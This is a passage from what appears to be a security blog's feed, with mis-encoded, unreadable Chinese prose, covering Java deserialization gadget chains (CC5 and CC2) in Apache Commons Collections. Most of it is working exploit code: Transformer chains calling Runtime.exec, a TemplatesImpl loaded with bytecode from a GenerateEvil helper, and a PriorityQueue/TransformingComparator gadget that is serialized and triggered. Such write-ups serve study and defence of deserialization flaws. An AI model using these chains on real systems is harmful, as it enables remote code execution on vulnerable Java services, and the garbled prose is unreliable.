class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> decorateMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>decorateMap<span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span> <span class="token string">"val"</span><span class="token punctuation">,</span> tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/09/06/CC5%E9%93%BE/image-20240906112432015.png" alt="image-20240906112432015"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;CC5ï¼Œè¯´ç™½äº†å°±æ˜¯åœ¨CC6çš„åŸºç¡€ä¸Šæ¢äº†ä¸ªå…¥å£ç±»&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8707-CC5%E9%93%BE/&quot;&gt;https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8707-CC5%E9%93%BE/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>CC2é“¾</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/09/05/CC2%E9%93%BE/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/09/05/CC2%E9%93%BE/</id>
    <published>2024-09-05T03:07:31.000Z</published>
    <updated>2024-09-05T09:02:26.925Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>CC2 è¿™æ¡é“¾å®é™…ä¸Šæ˜¯åœ¨ CC4 é“¾åŸºç¡€ä¸Šçš„ä¿®æ”¹ï¼Œç›®çš„æ˜¯ä¸ºäº†é¿å…ä½¿ç”¨ <code>Transformer</code> æ•°ç»„</p><p>å‚è€ƒï¼š</p><p><a href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/">https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/</a></p><p>ã€ŠJavaå®‰å…¨æ¼«è°ˆã€‹</p><span id="more"></span><hr><h1 id="æ„é€ ä¸å«æ•°ç»„çš„ååºåˆ—åŒ–Gadget"><a href="#æ„é€ ä¸å«æ•°ç»„çš„ååºåˆ—åŒ–Gadget" class="headerlink" title="æ„é€ ä¸å«æ•°ç»„çš„ååºåˆ—åŒ–Gadget"></a>æ„é€ ä¸å«æ•°ç»„çš„ååºåˆ—åŒ–Gadget</h1><p>è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š</p><ul><li><p>ä¸€ç§æ–¹æ³•æ˜¯JRMPï¼Œéœ€è¦å¤–è¿æœåŠ¡å™¨ï¼Œå‚è€ƒ<a href="https://blog.orange.tw/posts/2018-03-pwn-ctf-platform-with-java-jrmp-gadget/">https://blog.orange.tw/posts/2018-03-pwn-ctf-platform-with-java-jrmp-gadget/</a></p></li><li><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ä¹‹å‰ç”¨è¿‡çš„<code>TemplatesImpl</code>ï¼Œæˆ‘ä»¬åœ¨å‰é¢ cc1&#x2F;cc6 + TemplatesImpl çš„æ—¶å€™åˆ©ç”¨<code>InvokerTransformer</code>è°ƒç”¨<code>TemplatesImpl#newTransformer</code> æ–¹æ³•</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸è¿‡è¿™é‡Œä¾æ—§æ˜¯ç”¨åˆ°äº†Transformeræ•°ç»„ï¼Œå› æ­¤æˆ‘ä»¬è¿˜å¾—åšä¸€äº›ä¿®æ”¹</p></li></ul><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>å›å»å†çœ‹ä¸€ä¸‹cc2çš„é“¾å­æµç¨‹å›¾ï¼š</p><p><img src="/blog/2024/09/05/CC2%E9%93%BE/image-20240905162519773.png" alt="image-20240905162519773"></p><p>åœ¨ CC4 é“¾çš„åŸºç¡€ä¸Šï¼ŒæŠ›å¼ƒäº†ç”¨ <code>InstantiateTransformer</code> ç±»å°† <code>TrAXFilter</code> åˆå§‹åŒ–ï¼Œä»¥åŠ <code>TemplatesImpl.newTransformer()</code> è¿™ä¸ªæ­¥éª¤ï¼Œä½†æ˜¯å‰åŠéƒ¨åˆ†çš„ compare è¿˜æ˜¯å’Œ cc4 ä¸€æ ·ï¼Œè€Œä¸”æœ€åå‘½ä»¤æ‰§è¡Œçš„æ–¹å¼ä¹Ÿæ˜¯èµ° TemplatesImpl æ‰§è¡ŒåŠ¨æ€å­—èŠ‚ç ï¼Œéš¾ç‚¹å°±åœ¨äº InvokerTransform çš„è¿æ¥</p><h2 id="å†™exp"><a href="#å†™exp" class="headerlink" title="å†™exp"></a>å†™exp</h2><p>å…ˆæŠŠ cc4 çš„copyè¿‡æ¥ï¼Œç„¶åå°è¯•ç”¨ <code>InvokerTransform</code> è¿æ¥é“¾å­</p><p><code>TemplatesImpl</code>åŠ è½½å­—èŠ‚ç çš„éƒ¨åˆ†ä¸ç”¨åŠ¨</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>GenerateEvil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åä¾æ—§æ˜¯æ„é€  InvokerTransformer ç±»å»è°ƒç”¨<code>TemplatesImpl#newTransformer</code>æ–¹æ³•ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œä¹Ÿåˆ›å»ºä¸ªä¸ç”¨æ•°ç»„çš„ TransformingComparator ç±»å¯¹è±¡ fakeTransformerï¼Œä¼ â¼Šä¸€ä¸ªä¸´æ—¶çš„  Transformer ç±»å¯¹è±¡ï¼Œè®©å‘½ä»¤æ‰§è¡Œåªåœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ‰§è¡Œ</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">TransformingComparator</span> fakeTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯¹ç…§ä¸€ä¸‹åŸå…ˆçš„ä»£ç ï¼Œå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> obj <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>fakeTransformers<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">TransformingComparator</span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥åˆ›å»º PriorityQueue ç±»å¯¹è±¡ ä¼ å…¥ <code>transformingComparator</code> å¯¹è±¡ï¼Œä½†æ˜¯æ­¤æ—¶å‘é˜Ÿåˆ—é‡Œæ·»åŠ çš„å…ƒç´ å°±æ˜¯æˆ‘ä»¬å‰é¢åˆ›å»ºçš„ <code>TemplatesImpl</code> å¯¹è±¡ obj äº†<del>ï¼ˆç®€å•æ¥è¯´å°±æ˜¯æˆ‘ä»¬çš„objè¿˜æ²¡ç”¨å‘¢ï¼‰</del></p><p>è¿™æ˜¯å› ä¸ºæœ€åè°ƒç”¨ <code>PriorityQueue.compare()</code> çš„æ—¶å€™æ˜¯ä¼ å…¥é˜Ÿåˆ—ä¸­çš„ä¸¤ä¸ªå¯¹è±¡ï¼Œç„¶å <code>compare()</code> ä¸­è°ƒç”¨ <code>Transformer.transform(obj1)</code> çš„æ—¶å€™ç”¨çš„æ˜¯ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œå› æ­¤è¿™é‡Œéœ€è¦å°† priorityQueue é˜Ÿåˆ—ä¸­çš„ç¬¬ä¸€ä¸ªå¯¹è±¡è®¾ç½®ä¸ºæ„é€ å¥½çš„ obj å¯¹è±¡ï¼Œè¿™é‡Œè´ªæ–¹ä¾¿å°±ä¸¤ä¸ªéƒ½è®¾ç½®ä¸º obj äº†</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">PriorityQueue</span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>fakeTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æœ€åé€šè¿‡åå°„æŠŠ fakeTransformer çš„ transformer.iMethodName å€¼å†æ”¹æˆ invokerTransformer çš„ newTransformer</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>fakeTransformer<span class="token punctuation">,</span> <span class="token string">"transformer"</span><span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="æœ€ç»ˆexp"><a href="#æœ€ç»ˆexp" class="headerlink" title="æœ€ç»ˆexp"></a>æœ€ç»ˆexp</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc2</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>GenerateEvil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TransformingComparator</span> fakeTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PriorityQueue</span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>fakeTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>fakeTransformer<span class="token punctuation">,</span> <span class="token string">"transformer"</span><span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/09/05/CC2%E9%93%BE/image-20240905170210748.png" alt="image-20240905170210748"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;CC2 è¿™æ¡é“¾å®é™…ä¸Šæ˜¯åœ¨ CC4 é“¾åŸºç¡€ä¸Šçš„ä¿®æ”¹ï¼Œç›®çš„æ˜¯ä¸ºäº†é¿å…ä½¿ç”¨ &lt;code&gt;Transformer&lt;/code&gt; æ•°ç»„&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
